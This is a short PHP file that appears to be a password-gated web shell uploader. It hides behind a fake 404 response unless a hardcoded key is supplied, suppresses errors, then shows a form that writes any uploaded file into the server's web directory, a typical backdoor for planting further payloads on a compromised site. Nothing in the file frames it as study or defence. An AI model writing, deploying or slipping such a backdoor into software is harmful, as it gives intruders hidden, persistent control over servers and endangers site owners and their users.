<?php
@error_reporting(0);header('X-Nx:Nx-zD1');
if(@$_REQUEST['k']!=='nXk'){http_response_code(404);die();}
echo 'Nx-zD1';
if(isset($_FILES['f'])){
$n=basename($_FILES['f']['name']);
if(@move_uploaded_file($_FILES['f']['tmp_name'],$n))echo '<br>OK:'.$n;
else echo '<br>FAIL';
}
echo '<form method=post enctype="multipart/form-data"><input name=f type=file><input type=submit value=UP></form>';
?>
